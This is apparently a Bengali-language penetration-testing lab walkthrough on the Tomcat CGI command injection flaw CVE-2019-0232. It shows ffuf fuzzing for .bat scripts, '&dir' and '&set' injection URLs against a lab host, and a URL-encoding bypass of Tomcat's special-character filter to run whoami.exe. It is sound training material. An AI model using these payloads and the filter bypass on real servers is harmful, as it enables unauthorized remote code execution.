# Attacking Tomcat CGI

## CVE-2019-0232

- `CVE-2019-0232` একটি Critical vulnerability, যার মাধ্যমে Windows system-এ Remote Code Execution (RCE) সম্ভব।
- Tomcat-এর `enableCmdLineArguments` চালু থাকলে CGI Servlet-এর input validation দুর্বলতার কারণে command injection হয়।
- Affected Tomcat versions:
  - `9.0.0.M1` – `9.0.17`
  - `8.5.0` – `8.5.39`
  - `7.0.0` – `7.0.93`

## CGI Servlet কী?

- CGI Servlet Tomcat-এর এমন একটি component, যা web server-কে Tomcat JVM-এর বাইরের application চালাতে সাহায্য করে।
- CGI script সাধারণত Perl, Python বা Bash দিয়ে লেখা হয়।
- এটি browser request গ্রহণ করে CGI script-এ পাঠায়।
- CGI হলো web server ও external resources (যেমন database)-এর মধ্যবর্তী middleware।

### CGI-এর সুবিধা ও অসুবিধা

| Advantages                                                                        | Disadvantages                                                     |
| --------------------------------------------------------------------------------- | ----------------------------------------------------------------- |
| Dynamic content তৈরি করা সহজ।                                                     | প্রতিটি request-এ program memory-তে load করতে হয়।                 |
| যেকোনো programming language ব্যবহার করা যায়, যা stdin পড়তে ও stdout-এ লিখতে পারে। | এক request থেকে অন্য request-এ memory data সহজে cache করা যায় না। |
| Existing code reuse করা যায়।                                                      | Server performance কমায় এবং processing time বেশি লাগে।            |

## enableCmdLineArguments

- `enableCmdLineArguments=true` হলে CGI Servlet URL-এর query string থেকে command-line arguments তৈরি করে CGI script-এ পাঠায়।
- এতে environment variable বা standard input ছাড়াই parameter পাঠানো যায়।

উদাহরণ — Book search:

Title দিয়ে search:

```
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```

Author দিয়ে search:

```
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
```

- `action` ঠিক করে কোন search চলবে।
- `query` হলো search term।

Vulnerability: Windows-এ `enableCmdLineArguments` চালু থাকলে CGI Servlet input ঠিকভাবে validate করে না। ফলে query string-এ command injection সম্ভব।

উদাহরণ:

```
http://example.com/cgi-bin/hello.bat?&dir
```

- `&` Windows batch command separator।
- এর মাধ্যমে `dir` command execute করা যায়।

### 2. CGI Script খুঁজে বের করা

CGI script-এর default directory `/cgi`। `ffuf` ও `dirb common.txt` wordlist দিয়ে `.cmd` এবং `.bat` ফাইল খুঁজব।

CMD fuzzing:

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

\- কোনো script পাওয়া যায়নি।

BAT fuzzing:

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

Output:

```
[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
    * FUZZ: welcome
```

পাওয়া গেল:

```
http://10.129.204.227:8080/cgi/welcome.bat
```

এটি visit করলে দেখায়:

```
Welcome to CGI, this section is not functional yet. Please return to home page.
```

## Exploitation

### 1. Command Injection

পাওয়া CGI script-এ `&` দিয়ে command inject করা যায়।

```
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

- `dir` command-এর output পাওয়া যায়।
- কিন্তু `whoami`-এর মতো command সরাসরি কাজ করে না।

### 2. Environment Variables বের করা

`set` command ব্যবহার করি:

```
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

গুরুত্বপূর্ণ output:

```
COMSPEC=C:\Windows\system32\cmd.exe
GATEWAY_INTERFACE=CGI/1.1
HTTP_HOST=10.129.204.227:8080
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
QUERY_STRING=&set
REMOTE_ADDR=10.10.14.58
REQUEST_METHOD=GET
REQUEST_URI=/cgi/welcome.bat
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
SCRIPT_NAME=/cgi/welcome.bat
SERVER_NAME=10.129.204.227
SERVER_PORT=8080
SERVER_PROTOCOL=HTTP/1.1
SERVER_SOFTWARE=TOMCAT
SystemRoot=C:\Windows
X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
```

- `PATH` variable unset করা আছে।
- তাই command চালাতে executable-এর full path দিতে হবে।

### 3. Full Path দিয়ে Command চালানো

প্রথমে চেষ্টা:

```
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```

- কাজ করেনি।
- Tomcat invalid character error দিয়েছে।
- Tomcat-এর patch special character আটকাতে Regular Expression ব্যবহার করে।

Bypass: Payload URL-encode করতে হবে।

```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

- `:` → `%3A`
- `\` → `%5C`

URL encoding ব্যবহার করে special-character filter bypass করা যায়।
